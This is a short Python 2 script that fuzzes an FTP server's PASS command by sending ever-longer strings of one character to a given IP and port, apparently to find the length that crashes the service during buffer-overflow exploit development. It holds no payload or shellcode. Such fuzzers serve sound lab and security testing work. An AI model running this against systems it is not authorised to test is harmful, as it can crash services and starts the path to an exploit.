import socket
import sys
import time

import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--ip', help='Target IP address', required=True)
parser.add_argument('-p', '--port', help='Target port', required=True)
parser.add_argument('-c', '--char', help='Character to send, enclosed in quotes', required=True)
parser.add_argument('-ps', '--pause', help='Pause after each send to wait for confirmation to continue, True or False', required=True)
parser.add_argument('-l', '--length', help='Starting string length', required=True)
parser.add_argument('-inc', '--increment', help='Integer to increment length of string to send', required=True)
args = parser.parse_args()

count = int(args.length)

while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    time.sleep(1)
    print '[+] Sending variable of length ' + str(count)
    crash = str(args.char) * count

    count += int(args.increment)

    s.connect((args.ip, int(args.port)))
    s.recv(1024)
    s.send('USER anonymous\r\n')
    s.recv(1024)
    s.send('PASS ' + crash + '\r\n')
    s.close

    if args.pause:
        raw_input('[+] Press ENTER to continue...')
